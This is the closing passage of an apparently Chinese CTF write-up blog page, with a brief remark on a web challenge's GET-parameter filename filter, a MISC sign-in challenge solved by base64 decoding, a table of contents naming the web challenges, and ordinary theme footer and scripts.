<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="image-20231031224029185.png" alt="image-20231031224029185"></p>
<p>这里看了wp发现filename是get传参，然后是一个正则过滤</p>
<h2 id="misc">MISC</h2>
<h3 id="签到题">签到题</h3>
<p>发现是base128，两次base64解码即可</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="image-20231118225505778.png" alt="image-20231118225505778"></p>

<div class="article-footer fs14">
    <section id="license">
      <div class="header"><span>许可协议</span></div>
      <div class="body"><p>本文采用 <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">署名-非商业性使用-相同方式共享 4.0 国际</a> 许可协议，转载请注明出处。</p>
</div>
    </section>
    </div>
</article>
<div class="related-wrap" id="read-next"><section class="body"><div class="item" id="prev"><div class="note">较新文章</div><a href="/2023/10/03/zhuanxv/">Zhuanxv</a></div><div class="item" id="next"><div class="note">较早文章</div><a href="/2023/10/01/i-got-id-200/">i-got-id-200</a></div></section></div>






<footer class="page-footer footnote"><hr><div class="text"><p>本站由 <a href="/">hybcx</a> 使用 <a target="_blank" rel="noopener" href="https://github.com/xaoxuu/hexo-theme-stellar/tree/1.28.1">Stellar 1.28.1</a> 主题创建。<br>
本博客所有文章除特别声明外，均采用 <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> 许可协议，转载请注明出处。</p>
</div></footer>
<div class="main-mask" onclick="sidebar.dismiss()"></div></div><aside class="l_right">
<div class="widgets">



<widget class="widget-wrapper toc" id="data-toc" collapse="true"><div class="widget-header dis-select"><span class="name">本文目录</span><a class="cap-action" onclick="sidebar.toggleTOC()" ><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M10 6h11m-11 6h11m-11 6h11M4 6h1v4m-1 0h2m0 8H4c0-1 2-2 2-3s-1-1.5-2-1"/></svg></a></div><div class="widget-body"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#0x01-%E5%89%8D%E8%A8%80"><span class="toc-text">0x01 前言</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x02-%E7%8E%A9%E8%BD%AC%E9%A2%98%E7%9B%AE"><span class="toc-text">0x02 玩转题目</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#web"><span class="toc-text">WEB</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#week1%E9%A3%9E%E6%9C%BA%E5%A4%A7%E6%88%98"><span class="toc-text">[WEEK1]飞机大战</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#week1babyrce"><span class="toc-text">[WEEK1]babyRCE</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%B8%AD%E6%8B%AC%E5%8F%B7%E5%8C%B9%E9%85%8D%E7%BB%95%E8%BF%87"><span class="toc-text">[]中括号匹配绕过</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#week1%E7%99%BB%E5%BD%95%E5%B0%B1%E7%BB%99flag"><span class="toc-text">[WEEK1]登录就给flag</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#week1%E7%94%9F%E6%88%90%E4%BD%A0%E7%9A%84%E9%82%80%E8%AF%B7%E5%87%BD%E5%90%A7~"><span class="toc-text">[WEEK1]生成你的邀请函吧~</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#week11zzphp"><span class="toc-text">[WEEK1]1zzphp</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#week1ez_serialize"><span class="toc-text">[WEEK1]ez_serialize</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#week1ezphp"><span class="toc-text">[WEEK1]ezphp</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#week2no_wake_up"><span class="toc-text">[WEEK2]no_wake_up</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#week2ez_ssti"><span class="toc-text">[WEEK2]ez_ssti</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#week2easycms"><span class="toc-text">[WEEK2]EasyCMS</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%96%B9%E6%B3%95%E4%B8%80sql%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C"><span class="toc-text">方法一：sql命令执行</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%96%B9%E6%B3%95%E4%BA%8C%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0"><span class="toc-text">方法二：文件上传</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%8F%82%E8%80%83%E6%96%87%E7%AB%A0"><span class="toc-text">参考文章</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#week2serialize"><span class="toc-text">[WEEK2]serialize</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#week2md5%E7%9A%84%E4%BA%8B%E5%B0%B1%E6%8B%9C%E6%89%98%E4%BA%86"><span class="toc-text">[WEEK2]MD5的事就拜托了</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#week2ez_rce"><span class="toc-text">[WEEK2]ez_rce</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#week3%E5%BF%AB%E9%97%AE%E5%BF%AB%E7%AD%94"><span class="toc-text">[WEEK3]快问快答</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#week3sseerriiaalliizzee"><span class="toc-text">[WEEK3]sseerriiaalliizzee</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#week3gogogo"><span class="toc-text">[WEEK3]gogogo</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#misc"><span class="toc-text">MISC</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AD%BE%E5%88%B0%E9%A2%98"><span class="toc-text">签到题</span></a></li></ol></li></ol></li></ol></div><div class="widget-footer">

<a class="top" onclick="util.scrollTop()"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><g fill="none" stroke="currentColor" stroke-width="1.5"><path d="M2 12c0-4.714 0-7.071 1.464-8.536C4.93 2 7.286 2 12 2c4.714 0 7.071 0 8.535 1.464C22 4.93 22 7.286 22 12c0 4.714 0 7.071-1.465 8.535C19.072 22 16.714 22 12 22s-7.071 0-8.536-1.465C2 19.072 2 16.714 2 12Z"/><path stroke-linecap="round" stroke-linejoin="round" d="m9 15.5l3-3l3 3m-6-4l3-3l3 3"/></g></svg><span>回到顶部</span></a><a class="buttom" onclick="util.scrollComment()"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="currentColor" fill-rule="evenodd" d="M10.46 1.25h3.08c1.603 0 2.86 0 3.864.095c1.023.098 1.861.3 2.6.752a5.75 5.75 0 0 1 1.899 1.899c.452.738.654 1.577.752 2.6c.095 1.004.095 2.261.095 3.865v1.067c0 1.141 0 2.036-.05 2.759c-.05.735-.153 1.347-.388 1.913a5.75 5.75 0 0 1-3.112 3.112c-.805.334-1.721.408-2.977.43a10.81 10.81 0 0 0-.929.036c-.198.022-.275.054-.32.08c-.047.028-.112.078-.224.232c-.121.166-.258.396-.476.764l-.542.916c-.773 1.307-2.69 1.307-3.464 0l-.542-.916a10.605 10.605 0 0 0-.476-.764c-.112-.154-.177-.204-.224-.232c-.045-.026-.122-.058-.32-.08c-.212-.023-.49-.03-.93-.037c-1.255-.021-2.171-.095-2.976-.429A5.75 5.75 0 0 1 1.688 16.2c-.235-.566-.338-1.178-.389-1.913c-.049-.723-.049-1.618-.049-2.76v-1.066c0-1.604 0-2.86.095-3.865c.098-1.023.3-1.862.752-2.6a5.75 5.75 0 0 1 1.899-1.899c.738-.452 1.577-.654 2.6-.752C7.6 1.25 8.857 1.25 10.461 1.25M6.739 2.839c-.914.087-1.495.253-1.959.537A4.25 4.25 0 0 0 3.376 4.78c-.284.464-.45 1.045-.537 1.96c-.088.924-.089 2.11-.089 3.761v1c0 1.175 0 2.019.046 2.685c.045.659.131 1.089.278 1.441a4.25 4.25 0 0 0 2.3 2.3c.515.214 1.173.294 2.429.316h.031c.398.007.747.013 1.037.045c.311.035.616.104.909.274c.29.17.5.395.682.645c.169.232.342.525.538.856l.559.944a.52.52 0 0 0 .882 0l.559-.944c.196-.331.37-.624.538-.856c.182-.25.392-.476.682-.645c.293-.17.598-.24.909-.274c.29-.032.639-.038 1.037-.045h.032c1.255-.022 1.913-.102 2.428-.316a4.25 4.25 0 0 0 2.3-2.3c.147-.352.233-.782.278-1.441c.046-.666.046-1.51.046-2.685v-1c0-1.651 0-2.837-.089-3.762c-.087-.914-.253-1.495-.537-1.959a4.25 4.25 0 0 0-1.403-1.403c-.464-.284-1.045-.45-1.96-.537c-.924-.088-2.11-.089-3.761-.089h-3c-1.651 0-2.837 0-3.762.089" clip-rule="evenodd"/><path fill="currentColor" d="M9 11a1 1 0 1 1-2 0a1 1 0 0 1 2 0m4 0a1 1 0 1 1-2 0a1 1 0 0 1 2 0m4 0a1 1 0 1 1-2 0a1 1 0 0 1 2 0"/></svg><span>参与讨论</span></a></div></widget>
</div></aside><div class='float-panel blur'>
  <button type='button' style='display:none' class='laptop-only rightbar-toggle mobile' onclick='sidebar.rightbar()'>
    <svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M10 6h11m-11 6h11m-11 6h11M4 6h1v4m-1 0h2m0 8H4c0-1 2-2 2-3s-1-1.5-2-1"/></svg>
  </button>
  <button type='button' style='display:none' class='mobile-only leftbar-toggle mobile' onclick='sidebar.leftbar()'>
    <svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><g fill="none" stroke="currentColor" stroke-width="1.5"><path d="M2 11c0-3.771 0-5.657 1.172-6.828C4.343 3 6.229 3 10 3h4c3.771 0 5.657 0 6.828 1.172C22 5.343 22 7.229 22 11v2c0 3.771 0 5.657-1.172 6.828C19.657 21 17.771 21 14 21h-4c-3.771 0-5.657 0-6.828-1.172C2 18.657 2 16.771 2 13z"/><path id="sep" stroke-linecap="round" d="M5.5 10h6m-5 4h4m4.5 7V3"/></g></svg>
  </button>
</div>
</div><div class="scripts">
<script type="text/javascript">
  const ctx = {
    date_suffix: {
      just: `刚刚`,
      min: `分钟前`,
      hour: `小时前`,
      day: `天前`,
    },
    root : `/`,
  };

  // required plugins (only load if needs)
  if (`local_search`) {
    ctx.search = {};
    ctx.search.service = `local_search`;
    if (ctx.search.service == 'local_search') {
      let service_obj = Object.assign({}, `{"field":"all","path":"/search.json","content":true,"sort":"-date"}`);
      ctx.search[ctx.search.service] = service_obj;
    }
  }
  const def = {
    avatar: `https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.12/avatar/round/3442075.svg`,
    cover: `https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.12/cover/76b86c0226ffd.svg`,
  };
  const deps = {
    jquery: `https://cdn.bootcdn.net/ajax/libs/jquery/3.7.1/jquery.min.js`,
    marked: `https://cdn.bootcdn.net/ajax/libs/marked/4.0.18/marked.min.js`
  }
  

</script>

<script type="text/javascript">
  const utils = {
    // 懒加载 css https://github.com/filamentgroup/loadCSS
    css: (href, before, media, attributes) => {
      var doc = window.document;
      var ss = doc.createElement("link");
      var ref;
      if (before) {
        ref = before;
      } else {
        var refs = (doc.body || doc.getElementsByTagName("head")[0]).childNodes;
        ref = refs[refs.length - 1];
      }
      var sheets = doc.styleSheets;
      if (attributes) {
        for (var attributeName in attributes) {
          if (attributes.hasOwnProperty(attributeName)) {
            ss.setAttribute(attributeName, attributes[attributeName]);
          }
        }
      }
      ss.rel = "stylesheet";
      ss.href = href;
      ss.media = "only x";
      function ready(cb) {
        if (doc.body) {
          return cb();
        }
        setTimeout(function () {
          ready(cb);
        });
      }
      ready(function () {
        ref.parentNode.insertBefore(ss, before ? ref : ref.nextSibling);
      });
      var onloadcssdefined = function (cb) {
        var resolvedHref = ss.href;
        var i = sheets.length;
        while (i--) {
          if (sheets[i].href === resolvedHref) {
            return cb();
          }
        }
        setTimeout(function () {
          onloadcssdefined(cb);
        });
      };
      function loadCB() {
        if (ss.addEventListener) {
          ss.removeEventListener("load", loadCB);
        }
        ss.media = media || "all";
      }
      if (ss.addEventListener) {
        ss.addEventListener("load", loadCB);
      }
      ss.onloadcssdefined = onloadcssdefined;
      onloadcssdefined(loadCB);
      return ss;
    },

    js: (src, opt) => new Promise((resolve, reject) => {
      var script = document.createElement('script');
      if (src.startsWith('/')){
        src = ctx.root + src.substring(1);
      }
      script.src = src;
      if (opt) {
        for (let key of Object.keys(opt)) {
          script[key] = opt[key]
        }
      } else {
        // 默认异步，如果需要同步，第二个参数传入 {} 即可
        script.async = true
      }
      script.onerror = reject
      script.onload = script.onreadystatechange = function() {
        const loadState = this.readyState
        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
        script.onload = script.onreadystatechange = null
        resolve()
      }
      document.head.appendChild(script)
    }),

    jq: (fn) => {
      if (typeof jQuery === 'undefined') {
        utils.js(deps.jquery).then(fn)
      } else {
        fn()
      }
    },
    
    onLoading: (el) => {
      if (el) {
        $(el).append('<div class="loading-wrap"><svg xmlns="http://www.w3.org/2000/svg" width="2em" height="2em" preserveAspectRatio="xMidYMid meet" viewBox="0 0 24 24"><g fill="none" stroke="currentColor" stroke-linecap="round" stroke-width="2"><path stroke-dasharray="60" stroke-dashoffset="60" stroke-opacity=".3" d="M12 3C16.9706 3 21 7.02944 21 12C21 16.9706 16.9706 21 12 21C7.02944 21 3 16.9706 3 12C3 7.02944 7.02944 3 12 3Z"><animate fill="freeze" attributeName="stroke-dashoffset" dur="1.3s" values="60;0"/></path><path stroke-dasharray="15" stroke-dashoffset="15" d="M12 3C16.9706 3 21 7.02944 21 12"><animate fill="freeze" attributeName="stroke-dashoffset" dur="0.3s" values="15;0"/><animateTransform attributeName="transform" dur="1.5s" repeatCount="indefinite" type="rotate" values="0 12 12;360 12 12"/></path></g></svg></div>');
      }
    },
    onLoadSuccess: (el) => {
      if (el) {
        $(el).find('.loading-wrap').remove();
      }
    },
    onLoadFailure: (el) => {
      if (el) {
        $(el).find('.loading-wrap svg').remove();
        $(el).find('.loading-wrap').append('<svg xmlns="http://www.w3.org/2000/svg" width="2em" height="2em" preserveAspectRatio="xMidYMid meet" viewBox="0 0 24 24"><g fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2"><path stroke-dasharray="60" stroke-dashoffset="60" d="M12 3L21 20H3L12 3Z"><animate fill="freeze" attributeName="stroke-dashoffset" dur="0.5s" values="60;0"/></path><path stroke-dasharray="6" stroke-dashoffset="6" d="M12 10V14"><animate fill="freeze" attributeName="stroke-dashoffset" begin="0.6s" dur="0.2s" values="6;0"/></path></g><circle cx="12" cy="17" r="1" fill="currentColor" fill-opacity="0"><animate fill="freeze" attributeName="fill-opacity" begin="0.8s" dur="0.4s" values="0;1"/></circle></svg>');
        $(el).find('.loading-wrap').addClass('error');
      }
    },
    request: (el, url, callback, onFailure) => {
      let retryTimes = 3;
      utils.onLoading(el);
      function req() {
        return new Promise((resolve, reject) => {
          let status = 0; // 0 等待 1 完成 2 超时
          let timer = setTimeout(() => {
            if (status === 0) {
              status = 2;
              timer = null;
              reject('请求超时');
              if (retryTimes == 0) {
                onFailure();
              }
            }
          }, 5000);
          fetch(url).then(function(response) {
            if (status !== 2) {
              clearTimeout(timer);
              resolve(response);
              timer = null;
              status = 1;
            }
            if (response.ok) {
              return response.json();
            }
            throw new Error('Network response was not ok.');
          }).then(function(data) {
            retryTimes = 0;
            utils.onLoadSuccess(el);
            callback(data);
          }).catch(function(error) {
            if (retryTimes > 0) {
              retryTimes -= 1;
              setTimeout(() => {
                req();
              }, 5000);
            } else {
              utils.onLoadFailure(el);
              onFailure();
            }
          });
        });
      }
      req();
    },
  };
</script>

<script>
  const sidebar = {
    leftbar: () => {
      if (l_body) {
        l_body.toggleAttribute('leftbar');
        l_body.removeAttribute('rightbar');
      }
    },
    rightbar: () => {
      if (l_body) {
        l_body.toggleAttribute('rightbar');
        l_body.removeAttribute('leftbar');
      }
    },
    dismiss: () => {
      if (l_body) {
        l_body.removeAttribute('leftbar');
        l_body.removeAttribute('rightbar');
      }
    },
    toggleTOC: () => {
      document.querySelector('#data-toc').classList.toggle('collapse');
    }
  }
</script>

<!-- required -->
<script src="/js/main.js?v=1.28.1" async></script>

<!-- optional -->



<script defer>
  window.addEventListener('DOMContentLoaded', (event) => {
    ctx.services = Object.assign({}, JSON.parse(`{"mdrender":{"js":"/js/services/mdrender.js"},"siteinfo":{"js":"/js/services/siteinfo.js","api":null},"ghinfo":{"js":"/js/services/ghinfo.js"},"sites":{"js":"/js/services/sites.js"},"friends":{"js":"/js/services/friends.js"},"timeline":{"js":"/js/services/timeline.js"},"fcircle":{"js":"/js/services/fcircle.js"},"weibo":{"js":"/js/services/weibo.js"},"memos":{"js":"/js/services/memos.js"}}`));
    for (let id of Object.keys(ctx.services)) {
      const js = ctx.services[id].js;
      if (id == 'siteinfo') {
        ctx.cardlinks = document.querySelectorAll('a.link-card[cardlink]');
        if (ctx.cardlinks?.length > 0) {
          utils.js(js, { defer: true }).then(function () {
            setCardLink(ctx.cardlinks);
          });
        }
      } else {
        const els = document.getElementsByClassName(`ds-${id}`);
        if (els?.length > 0) {
          utils.jq(() => {
            if (id == 'timeline' || 'memos' || 'marked') {
              utils.js(deps.marked).then(function () {
                utils.js(js, { defer: true });
              });
            } else {
              utils.js(js, { defer: true });
            }
          });
        }
      }
    }
  });
</script>

<script>
  window.addEventListener('DOMContentLoaded', (event) => {
    ctx.search = {
      path: `/search.json`,
    }
    utils.js('/js/search/local-search.js', { defer: true });
  });
</script><script>
  window.FPConfig = {
    delay: 0,
    ignoreKeywords: [],
    maxRPS: 5,
    hoverDelay: 25
  };
</script>
<script defer src="https://cdn.bootcdn.net/ajax/libs/flying-pages/2.1.2/flying-pages.min.js"></script><script defer src="https://cdn.bootcdn.net/ajax/libs/vanilla-lazyload/17.8.4/lazyload.min.js"></script>
<script>
  // https://www.npmjs.com/package/vanilla-lazyload
  // Set the options globally
  // to make LazyLoad self-initialize
  window.lazyLoadOptions = {
    elements_selector: ".lazy",
  };
  // Listen to the initialization event
  // and get the instance of LazyLoad
  window.addEventListener(
    "LazyLoad::Initialized",
    function (event) {
      window.lazyLoadInstance = event.detail.instance;
    },
    false
  );
  document.addEventListener('DOMContentLoaded', function () {
    window.lazyLoadInstance?.update();
  });
</script><script>
  ctx.fancybox = {
    selector: `.timenode p>img`,
    css: `https://cdn.bootcdn.net/ajax/libs/fancyapps-ui/5.0.22/fancybox/fancybox.min.css`,
    js: `https://cdn.bootcdn.net/ajax/libs/fancyapps-ui/5.0.22/fancybox/fancybox.umd.min.js`
  };
  var selector = '[data-fancybox]:not(.error)';
  if (ctx.fancybox.selector) {
    selector += `, ${ctx.fancybox.selector}`
  }
  var needFancybox = document.querySelectorAll(selector).length !== 0;
  if (!needFancybox) {
    const els = document.getElementsByClassName('ds-memos');
    if (els != undefined && els.length > 0) {
      needFancybox = true;
    }
  }
  if (needFancybox) {
    utils.css(ctx.fancybox.css);
    utils.js(ctx.fancybox.js, { defer: true }).then(function () {
      Fancybox.bind(selector, {
        hideScrollbar: false,
        Thumbs: {
          autoStart: false,
        },
        caption: (fancybox, slide) => {
          return slide.triggerEl.alt || slide.triggerEl.dataset.caption || null
        }
      });
    })
  }
</script>
<script>
  window.addEventListener('DOMContentLoaded', (event) => {
    const swiper_api = document.getElementById('swiper-api');
    if (swiper_api != undefined) {
      utils.css(`https://unpkg.com/swiper@10.3.1/swiper-bundle.min.css`);
      utils.js(`https://unpkg.com/swiper@10.3.1/swiper-bundle.min.js`, { defer: true }).then(function () {
        const effect = swiper_api.getAttribute('effect') || '';
        var swiper = new Swiper('.swiper#swiper-api', {
          slidesPerView: 'auto',
          spaceBetween: 8,
          centeredSlides: true,
          effect: effect,
          rewind: true,
          pagination: {
            el: '.swiper-pagination',
            clickable: true,
          },
          navigation: {
            nextEl: '.swiper-button-next',
            prevEl: '.swiper-button-prev',
          },
        });
      })
    }
  });
</script>
<script>
  document.addEventListener('DOMContentLoaded', function () {
    window.codeElements = document.querySelectorAll('.code');
    if (window.codeElements.length > 0) {
      ctx.copycode = {
        default_text: `Copy`,
        success_text: `Copied`,
        toast: `复制成功`,
      };
      utils.js('/js/plugins/copycode.js');
    }
  });
</script>


<!-- inject -->

</div></body></html>
